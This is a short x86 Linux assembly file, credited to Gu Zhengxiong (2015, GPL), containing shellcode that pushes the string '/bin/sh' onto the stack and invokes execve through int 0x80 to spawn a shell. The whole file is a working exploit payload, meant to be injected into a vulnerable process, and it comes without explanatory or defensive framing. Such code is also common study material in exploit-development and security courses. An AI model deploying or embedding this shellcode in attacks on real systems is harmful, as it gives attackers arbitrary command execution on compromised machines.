    #
    # Execve /bin/sh Shellcode Via Push (Linux x86)
    #
    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)
    #
    # 18 February 2015
    #
    # GPL
    #


    .global _start
_start:
    xorl %eax, %eax
    # \0xff 'h' 's' '/'
    pushl $0xff68732f
    # 'n' 'i' 'b' '/'
    pushl $0x6e69622f

    movb %al, 7(%esp)

    # __NR_execve 11
    movb $11, %al

    # const char *filename
    movl %esp, %ebx

    # char *const argv[]
    xorl %ecx, %ecx

    # char *const envp[]
    xorl %edx, %edx

    int $0x80
